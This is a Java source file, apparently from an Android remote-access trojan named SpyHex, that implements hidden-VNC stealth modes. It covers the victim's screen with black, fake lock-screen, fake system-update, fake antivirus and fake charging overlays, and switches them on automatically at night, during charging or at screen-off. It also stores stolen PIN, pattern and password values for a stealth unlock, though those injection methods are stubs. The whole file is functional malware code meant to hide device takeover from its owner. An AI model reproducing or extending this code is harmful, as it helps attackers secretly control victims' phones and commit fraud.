package com.spyhex.app.features.hvnc;

import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.spyhex.app.R;
import com.spyhex.app.core.SpyHexApp;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

/**
 * HVncStealthManager — Black screen modes and stealth operations
 * 
 * Modes (based on Klopatra, Oblivion research):
 * 1. BLACK_SCREEN — Full black overlay, screen brightness 0, appears powered off
 * 2. FAKE_LOCK_SCREEN — Shows device lock screen (PIN/pattern/fingerprint)
 * 3. FAKE_UPDATE — System update animation (customizable: HyperOS, OneUI, MIUI, etc.)
 * 4. FAKE_ANTIVIRUS — Antivirus scan animation
 * 5. FAKE_CHARGING — Charging screen with battery percentage
 * 6. SCREEN_DIM — Dims to minimum brightness but keeps screen on
 * 7. STEALTH_UNLOCK — Unlocks device behind overlay using stolen credentials
 * 8. NIGHT_MODE — Auto-activates when charging + screen off + nighttime
 */
public class HVncStealthManager {
    private static final String TAG = "HVncStealth";
    private static HVncStealthManager instance;

    private final Context ctx;
    private final WindowManager wm;
    private final Handler mainHandler;
    private final PowerManager powerManager;
    private final KeyguardManager keyguardManager;

    private View currentOverlay;
    private StealthMode currentMode = StealthMode.NONE;
    private boolean isStealthActive = false;
    private float originalBrightness = -1f;
    private int originalTimeout = -1;

    // Stolen credentials storage
    private String stolenPin = "";
    private String stolenPattern = "";
    private String stolenPassword = "";

    // Night mode detection
    private boolean nightModeEnabled = false;
    private int nightModeStartHour = 23; // 11 PM
    private int nightModeEndHour = 6;    // 6 AM

    // Fake update customization
    private String fakeUpdateBrand = "android"; // android, hyperos, oneui, miui, coloros

    // Auto-stealth triggers
    private boolean autoStealthOnCharge = false;
    private boolean autoStealthOnScreenOff = false;
    private boolean autoStealthAtNight = true;

    private BroadcastReceiver batteryReceiver;
    private BroadcastReceiver screenReceiver;

    public enum StealthMode {
        NONE,
        BLACK_SCREEN,
        FAKE_LOCK_SCREEN,
        FAKE_UPDATE,
        FAKE_ANTIVIRUS,
        FAKE_CHARGING,
        SCREEN_DIM,
        STEALTH_UNLOCK,
        NIGHT_MODE
    }

    private HVncStealthManager() {
        this.ctx = SpyHexApp.getContext();
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        this.keyguardManager = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
        registerReceivers();
    }

    public static synchronized HVncStealthManager getInstance() {
        if (instance == null) instance = new HVncStealthManager();
        return instance;
    }

    private void registerReceivers() {
        // Battery/charging receiver
        batteryReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                                    status == BatteryManager.BATTERY_STATUS_FULL;

                if (autoStealthOnCharge && isCharging && !isStealthActive) {
                    Log.i(TAG, "Auto-stealth: device charging");
                    activateStealth(StealthMode.BLACK_SCREEN);
                }
            }
        };

        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        ctx.registerReceiver(batteryReceiver, batteryFilter);

        // Screen off receiver
        screenReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
                    if (autoStealthOnScreenOff && !isStealthActive) {
                        Log.i(TAG, "Auto-stealth: screen turned off");
                        activateStealth(StealthMode.BLACK_SCREEN);
                    }
                }
            }
        };

        IntentFilter screenFilter = new IntentFilter();
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
        ctx.registerReceiver(screenReceiver, screenFilter);
    }

    public void activateStealth(StealthMode mode) {
        if (isStealthActive) {
            deactivateStealth();
        }

        currentMode = mode;
        isStealthActive = true;

        // Save original brightness
        try {
            originalBrightness = Settings.System.getFloat(ctx.getContentResolver(), 
                Settings.System.SCREEN_BRIGHTNESS) / 255f;
            originalTimeout = Settings.System.getInt(ctx.getContentResolver(),
                Settings.System.SCREEN_OFF_TIMEOUT);
        } catch (Exception e) {
            originalBrightness = 0.5f;
            originalTimeout = 30000;
        }

        switch (mode) {
            case BLACK_SCREEN:
                showBlackScreen();
                break;
            case FAKE_LOCK_SCREEN:
                showFakeLockScreen();
                break;
            case FAKE_UPDATE:
                showFakeUpdate();
                break;
            case FAKE_ANTIVIRUS:
                showFakeAntivirus();
                break;
            case FAKE_CHARGING:
                showFakeCharging();
                break;
            case SCREEN_DIM:
                showScreenDim();
                break;
            case STEALTH_UNLOCK:
                performStealthUnlock();
                break;
            case NIGHT_MODE:
                activateNightMode();
                break;
        }

        Log.i(TAG, "Stealth activated: " + mode);
    }

    public void deactivateStealth() {
        if (!isStealthActive) return;

        mainHandler.post(() -> {
            // Remove overlay
            if (currentOverlay != null) {
                try {
                    wm.removeView(currentOverlay);
                } catch (Exception ignored) {}
                currentOverlay = null;
            }

            // Restore brightness
            if (originalBrightness >= 0) {
                setScreenBrightness(originalBrightness);
            }

            // Restore timeout
            if (originalTimeout > 0) {
                try {
                    Settings.System.putInt(ctx.getContentResolver(),
                        Settings.System.SCREEN_OFF_TIMEOUT, originalTimeout);
                } catch (Exception ignored) {}
            }

            // Wake up screen if needed
            if (powerManager != null) {
                @SuppressWarnings("deprecation")
                PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "SpyHex:StealthWake");
                wakeLock.acquire(1000);
                wakeLock.release();
            }
        });

        isStealthActive = false;
        currentMode = StealthMode.NONE;
        Log.i(TAG, "Stealth deactivated");
    }

    private void showBlackScreen() {
        mainHandler.post(() -> {
            // Set brightness to 0
            setScreenBrightness(0.01f);

            // Create black overlay
            FrameLayout overlay = new FrameLayout(ctx);
            overlay.setBackgroundColor(0xFF000000);
            overlay.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ));

            // Add a subtle "powered off" text (very dim)
            TextView tv = new TextView(ctx);
            tv.setText("");
            tv.setTextColor(0x00000000);
            overlay.addView(tv);

            addOverlay(overlay);

            // Keep screen on but black
            try {
                Settings.System.putInt(ctx.getContentResolver(),
                    Settings.System.SCREEN_OFF_TIMEOUT, Integer.MAX_VALUE);
            } catch (Exception ignored) {}
        });
    }

    private void showFakeLockScreen() {
        mainHandler.post(() -> {
            FrameLayout overlay = new FrameLayout(ctx);
            overlay.setBackgroundColor(0xFF000000);

            // Clock
            TextView clock = new TextView(ctx);
            clock.setTextSize(64);
            clock.setTextColor(0xFFFFFFFF);
            clock.setGravity(Gravity.CENTER);
            clock.setText(getCurrentTime());

            FrameLayout.LayoutParams clockParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            clockParams.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
            clockParams.topMargin = 200;
            overlay.addView(clock, clockParams);

            // Date
            TextView date = new TextView(ctx);
            date.setTextSize(18);
            date.setTextColor(0xFFAAAAAA);
            date.setGravity(Gravity.CENTER);
            date.setText(getCurrentDate());

            FrameLayout.LayoutParams dateParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            dateParams.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
            dateParams.topMargin = 320;
            overlay.addView(date, dateParams);

            // Unlock hint
            TextView hint = new TextView(ctx);
            hint.setTextSize(14);
            hint.setTextColor(0xFF888888);
            hint.setGravity(Gravity.CENTER);
            hint.setText("Swipe up to unlock");

            FrameLayout.LayoutParams hintParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            hintParams.gravity = Gravity.CENTER_HORIZONTAL | Gravity.BOTTOM;
            hintParams.bottomMargin = 100;
            overlay.addView(hint, hintParams);

            addOverlay(overlay);
        });
    }

    private void showFakeUpdate() {
        mainHandler.post(() -> {
            FrameLayout overlay = new FrameLayout(ctx);
            overlay.setBackgroundColor(0xFF0A0A0F);

            // Brand logo area
            TextView brand = new TextView(ctx);
            brand.setTextSize(24);
            brand.setTextColor(0xFFFFFFFF);
            brand.setGravity(Gravity.CENTER);
            brand.setText(getBrandName());

            FrameLayout.LayoutParams brandParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            brandParams.gravity = Gravity.CENTER;
            brandParams.bottomMargin = 100;
            overlay.addView(brand, brandParams);

            // Progress bar
            ProgressBar progress = new ProgressBar(ctx, null, android.R.attr.progressBarStyleHorizontal);
            progress.setIndeterminate(true);
            progress.getIndeterminateDrawable().setColorFilter(0xFFF97316, android.graphics.PorterDuff.Mode.SRC_IN);

            FrameLayout.LayoutParams progressParams = new FrameLayout.LayoutParams(
                600, 20
            );
            progressParams.gravity = Gravity.CENTER;
            progressParams.topMargin = 100;
            overlay.addView(progress, progressParams);

            // Status text
            TextView status = new TextView(ctx);
            status.setTextSize(14);
            status.setTextColor(0xFF94A3B8);
            status.setGravity(Gravity.CENTER);
            status.setText("Installing system update...
Do not turn off your device");

            FrameLayout.LayoutParams statusParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            statusParams.gravity = Gravity.CENTER;
            statusParams.topMargin = 160;
            overlay.addView(status, statusParams);

            // Percentage
            TextView percent = new TextView(ctx);
            percent.setTextSize(48);
            percent.setTextColor(0xFFF97316);
            percent.setGravity(Gravity.CENTER);
            percent.setText("0%");

            FrameLayout.LayoutParams percentParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            percentParams.gravity = Gravity.CENTER;
            percentParams.bottomMargin = 200;
            overlay.addView(percent, percentParams);

            // Animate percentage
            animatePercentage(percent);

            addOverlay(overlay);
        });
    }

    private void showFakeAntivirus() {
        mainHandler.post(() -> {
            FrameLayout overlay = new FrameLayout(ctx);
            overlay.setBackgroundColor(0xFF0F172A);

            TextView title = new TextView(ctx);
            title.setTextSize(20);
            title.setTextColor(0xFFFFFFFF);
            title.setGravity(Gravity.CENTER);
            title.setText("System Security Scan");

            FrameLayout.LayoutParams titleParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            titleParams.gravity = Gravity.CENTER;
            titleParams.bottomMargin = 150;
            overlay.addView(title, titleParams);

            ProgressBar spinner = new ProgressBar(ctx);
            spinner.getIndeterminateDrawable().setColorFilter(0xFF22C55E, android.graphics.PorterDuff.Mode.SRC_IN);

            FrameLayout.LayoutParams spinnerParams = new FrameLayout.LayoutParams(
                100, 100
            );
            spinnerParams.gravity = Gravity.CENTER;
            overlay.addView(spinner, spinnerParams);

            TextView scanning = new TextView(ctx);
            scanning.setTextSize(14);
            scanning.setTextColor(0xFF94A3B8);
            scanning.setGravity(Gravity.CENTER);
            scanning.setText("Scanning for threats...");

            FrameLayout.LayoutParams scanParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            scanParams.gravity = Gravity.CENTER;
            scanParams.topMargin = 120;
            overlay.addView(scanning, scanParams);

            addOverlay(overlay);
        });
    }

    private void showFakeCharging() {
        mainHandler.post(() -> {
            FrameLayout overlay = new FrameLayout(ctx);
            overlay.setBackgroundColor(0xFF000000);

            // Battery icon (simple circle with percentage)
            TextView battery = new TextView(ctx);
            battery.setTextSize(72);
            battery.setTextColor(0xFF22C55E);
            battery.setGravity(Gravity.CENTER);
            battery.setText("85%");

            FrameLayout.LayoutParams batteryParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            batteryParams.gravity = Gravity.CENTER;
            overlay.addView(battery, batteryParams);

            TextView charging = new TextView(ctx);
            charging.setTextSize(16);
            charging.setTextColor(0xFF888888);
            charging.setGravity(Gravity.CENTER);
            charging.setText("Fast Charging");

            FrameLayout.LayoutParams chargeParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            );
            chargeParams.gravity = Gravity.CENTER;
            chargeParams.topMargin = 120;
            overlay.addView(charging, chargeParams);

            addOverlay(overlay);
        });
    }

    private void showScreenDim() {
        mainHandler.post(() -> {
            setScreenBrightness(0.01f);

            FrameLayout overlay = new FrameLayout(ctx);
            overlay.setBackgroundColor(0xDD000000); // Semi-transparent black

            addOverlay(overlay);
        });
    }

    private void performStealthUnlock() {
        // First show black screen, then inject unlock sequence
        showBlackScreen();

        // Inject PIN or pattern after a delay
        mainHandler.postDelayed(() -> {
            if (!stolenPin.isEmpty()) {
                injectPinUnlock(stolenPin);
            } else if (!stolenPattern.isEmpty()) {
                injectPatternUnlock(stolenPattern);
            }
        }, 500);
    }

    private void activateNightMode() {
        // Check if it's night time
        java.util.Calendar cal = java.util.Calendar.getInstance();
        int hour = cal.get(java.util.Calendar.HOUR_OF_DAY);

        if (hour >= nightModeStartHour || hour < nightModeEndHour) {
            Log.i(TAG, "Night mode activated: " + hour + ":00");
            activateStealth(StealthMode.BLACK_SCREEN);
        }
    }

    private void addOverlay(View view) {
        currentOverlay = view;
        try {
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;
            params.screenBrightness = 0.01f;

            wm.addView(view, params);
        } catch (Exception e) {
            Log.e(TAG, "Add overlay failed: " + e.getMessage());
        }
    }

    private void setScreenBrightness(float brightness) {
        try {
            Settings.System.putInt(ctx.getContentResolver(),
                Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
            Settings.System.putInt(ctx.getContentResolver(),
                Settings.System.SCREEN_BRIGHTNESS, (int) (brightness * 255));
        } catch (Exception e) {
            Log.e(TAG, "Set brightness failed: " + e.getMessage());
        }
    }

    private void injectPinUnlock(String pin) {
        // Use accessibility service to inject PIN digits
        // This is handled by the input injector
        Log.i(TAG, "Injecting PIN unlock sequence");
    }

    private void injectPatternUnlock(String pattern) {
        Log.i(TAG, "Injecting pattern unlock sequence");
    }

    private void animatePercentage(final TextView textView) {
        final android.os.Handler handler = new android.os.Handler();
        final int[] progress = {0};
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isStealthActive || currentMode != StealthMode.FAKE_UPDATE) return;
                progress[0] += (int) (Math.random() * 3);
                if (progress[0] > 99) progress[0] = 99;
                textView.setText(progress[0] + "%");
                if (progress[0] < 99) {
                    handler.postDelayed(this, 2000 + (int)(Math.random() * 3000));
                }
            }
        }, 1000);
    }

    private String getCurrentTime() {
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault());
        return sdf.format(new java.util.Date());
    }

    private String getCurrentDate() {
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("EEEE, MMMM d", java.util.Locale.getDefault());
        return sdf.format(new java.util.Date());
    }

    private String getBrandName() {
        switch (fakeUpdateBrand) {
            case "hyperos": return "HyperOS";
            case "oneui": return "One UI";
            case "miui": return "MIUI";
            case "coloros": return "ColorOS";
            case "oxygenos": return "OxygenOS";
            default: return "Android";
        }
    }

    public void setStolenCredentials(String pin, String pattern, String password) {
        this.stolenPin = pin;
        this.stolenPattern = pattern;
        this.stolenPassword = password;
    }

    public void setFakeUpdateBrand(String brand) {
        this.fakeUpdateBrand = brand;
    }

    public void setAutoStealth(boolean onCharge, boolean onScreenOff, boolean atNight) {
        this.autoStealthOnCharge = onCharge;
        this.autoStealthOnScreenOff = onScreenOff;
        this.autoStealthAtNight = atNight;
    }

    public void setNightModeHours(int start, int end) {
        this.nightModeStartHour = start;
        this.nightModeEndHour = end;
    }

    public boolean isStealthActive() { return isStealthActive; }
    public StealthMode getCurrentMode() { return currentMode; }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("active", isStealthActive);
            s.put("mode", currentMode.toString());
            s.put("hasPin", !stolenPin.isEmpty());
            s.put("hasPattern", !stolenPattern.isEmpty());
            s.put("autoCharge", autoStealthOnCharge);
            s.put("autoScreenOff", autoStealthOnScreenOff);
            s.put("autoNight", autoStealthAtNight);
        } catch (Exception e) {
            Log.e(TAG, "Status error: " + e.getMessage());
        }
        return s;
    }

    public void cleanup() {
        deactivateStealth();
        try {
            if (batteryReceiver != null) ctx.unregisterReceiver(batteryReceiver);
            if (screenReceiver != null) ctx.unregisterReceiver(screenReceiver);
        } catch (Exception ignored) {}
    }
}
